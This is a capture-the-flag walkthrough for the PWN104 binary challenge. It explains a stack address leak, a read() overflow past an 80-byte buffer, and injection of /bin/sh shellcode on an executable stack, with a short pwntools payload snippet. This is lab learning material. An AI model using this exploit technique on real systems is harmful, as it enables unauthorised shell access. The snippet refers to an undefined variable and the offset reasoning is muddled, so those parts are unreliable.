# PWN104 CTF Walkthrough

## Executive Summary

This is a sophisticated exploitation challenge combining information leaks and shellcode execution. The binary has a disabled NX bit (executable stack), making it vulnerable to direct shellcode execution. The vulnerability exploits a stack leak via printf, then overwrites the return address with leaked stack address to execute injected shellcode.

---

## Phase 1: Reconnaissance

### 1.1 File Information

**Target Binary:** `/home/jack/Documents/hacktivities/projects/pwn ctfs/pwn104/pwn104`

**File Type Analysis:**
```
ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked
Not PIE (0x400000)
Not stripped
```

### 1.2 Security Protections Analysis

Using `checksec`:

| Protection | Status | Notes |
|-----------|--------|-------|
| **RELRO** | Partial RELRO | GOT modifiable |
| **Stack Canary** | ❌ Not Found | **VULNERABLE** |
| **NX** | ❌ DISABLED | **CRITICAL: Executable stack!** |
| **PIE** | ❌ No | Fixed addresses (0x400000) |
| **RWX Segments** | ✅ Yes | Readable, Writable, Executable sections |
| **Stripped** | ❌ No | Symbols available |

**Critical Finding:** The stack is executable! This allows shellcode injection directly on the stack.

### 1.3 Key Strings

```
"I think I have some super powers"
"especially executable powers"
"Can we go for a fight?"
"I'm waiting for you at %p"
```

The format string `%p` is the key to leaking a stack address.

---

## Phase 2: Binary Analysis

### 2.1 Vulnerable main() Function

```assembly
00000000004011cd <main>:
  4011cd: 55                    push   %rbp
  4011ce: 48 89 e5              mov    %rsp,%rbp
  4011d1: 48 83 ec 50           sub    $0x50,%rsp        # 80-byte buffer
  ...
  4011e9-401211: [puts statements]
  401216: 48 8d 45 b0           lea    -0x50(%rbp),%rax  # Buffer at -0x50
  40121a: 48 89 c6              mov    %rax,%rsi
  40121d: 48 8d 05 6c 0f 00 00  lea    0xf6c(%rip),%rax  # Format string "%p"
  401224: 48 89 c7              mov    %rax,%rdi
  401227: b8 00 00 00 00        mov    $0x0,%eax
  40122c: e8 0f fe ff ff        call   401040 <printf@plt>  # Printf with leak
  401231: 48 8d 45 b0           lea    -0x50(%rbp),%rax
  401235: ba c8 00 00 00        mov    $0xc8,%edx        # 200 bytes max
  40123a: 48 89 c6              mov    %rax,%rsi
  40123d: bf 00 00 00 00        mov    $0x0,%edi
  401242: e8 04 fe ff ff        call   401050 <read@plt>  # Read input into buffer
  40124c: 90                    nop
  40124d: c9                    leave
  40124e: c3                    ret
```

### 2.2 Vulnerability Details

**Two-Stage Exploitation:**

1. **Stage 1: Printf Leak**
   - Printf with format string `%p` leaks a stack address
   - This address is used to calculate shellcode position

2. **Stage 2: Buffer Overflow + Shellcode**
   - 80-byte buffer allocated at RBP - 0x50
   - Read accepts up to 200 bytes (0xc8)
   - Allows overflow of return address
   - Injected shellcode on stack is executable

### 2.3 Stack Layout

```
RBP + 0x8      ← Return Address (8 bytes) - TARGET FOR OVERFLOW
RBP + 0x0      ← Frame Pointer
RBP - 0x50     ← Buffer (80 bytes)
RBP - 0x50 + 80 ← Buffer End
```

**Key offsets:**
- Buffer size: 0x50 = 80 bytes
- Distance from buffer to RBP: 80 bytes
- Distance from buffer to return address: 80 + 8 = **88 bytes**

---

## Phase 3: Exploitation Strategy

### 3.1 The Attack Plan

**Stage 1: Leak Stack Address**
- The program prints "I'm waiting for you at %p"
- The format string `%p` leaks an address from the stack
- This address points somewhere on the stack near our buffer

**Stage 2: Inject Shellcode + Overflow**
- Generate shellcode that executes `/bin/sh`
- Inject shellcode into the 80-byte buffer
- Pad remaining space
- Overwrite return address with the leaked stack address
- When function returns, execution jumps to shellcode on stack

### 3.2 Key Insight: Why Leaked Address Works

The leaked address (`%p`) points to a location on the stack. By analyzing the exploit:
- The shellcode is placed at the start of the buffer
- The buffer is at a predictable offset from the leaked address
- We calculate: `leaked_address = buffer_address + some_offset`
- We can then overwrite return address to point to the leaked address (which contains our shellcode)

### 3.3 Payload Construction

```python
shellcode = asm(shellcraft.sh())  # Generate /bin/sh shellcode (variable length)
offset = b"A" * (88 - len(sc))    # Padding to reach return address
payload = shellcode + offset + p64(leaked_stack_address)
```

**Breakdown:**
- `shellcode`: Generated shellcode (typically 30-50 bytes)
- `offset`: Padding to align properly
- `p64(leaked_stack_address)`: 8-byte return address that points back to shellcode

### 3.4 Execution Flow

1. **Program starts, allocates buffer at stack location X**
2. **Printf leaks address Y (near stack location)**
3. **We send shellcode + padding + leaked_address**
4. **Buffer overflow overwrites return address**
5. **Function returns, execution jumps to leaked_address**
6. **CPU executes shellcode on the stack**
7. **Shellcode spawns `/bin/sh`**
8. **Interactive shell obtained**

---

## Phase 4: Why This Works

| Factor | Explanation |
|--------|------------|
| **Executable Stack** | NX disabled = code on stack executes |
| **Fixed Addresses** | No PIE = reliable address calculations |
| **Buffer Overflow** | 200-byte read into 80-byte buffer allows return address overwrite |
| **Stack Leak** | Printf `%p` leaks addresses for ROP/shellcode |
| **No Canary** | Return address easily overwritten without detection |

---

## Phase 5: Key Learnings

| Concept | Explanation |
|---------|------------|
| **Information Leak** | Using printf `%p` to reveal stack layout |
| **Shellcode Injection** | Placing executable code directly on stack |
| **Stack Alignment** | Ensuring proper execution environment for shellcode |
| **Address Calculation** | Using leaked addresses for reliable exploitation |
| **Disabled NX** | Executable stack is a critical vulnerability |

---

## Phase 6: Differences from Previous Challenges

| Feature | PWN101 | PWN102 | PWN103 | PWN104 |
|---------|--------|--------|--------|---------|
| Vuln Type | Buffer Overflow | Buffer Overflow | Buffer Overflow + ROP | Shellcode + Leak |
| Input Function | gets() | scanf() | scanf() | read() |
| Buffer Size | 64 bytes | 112 bytes | 32 bytes | 80 bytes |
| NX | Enabled | Enabled | Enabled | **DISABLED** |
| PIE | Yes | Yes | No | No |
| Information Leak | No | No | No | **Yes (printf)** |
| Shellcode Injection | No | No | No | **Yes** |
| Difficulty | Beginner | Intermediate | Advanced | Advanced |

---

## Commands Reference

```bash
checksec --file=./pwn104
objdump -d ./pwn104 | grep -A 40 "<main>:"
strings ./pwn104 | grep "%p"
objdump -s ./pwn104 | grep -A 5 "0x120"
```

---

## Exploitation Summary

1. Run binary and capture leaked stack address from printf output
2. Generate shellcode using pwntools shellcraft
3. Calculate payload: `[shellcode] + [padding to 88 bytes] + [leaked_address]`
4. Send payload via stdin
5. Program returns from main, jumps to shellcode
6. Shellcode executes, spawning interactive shell
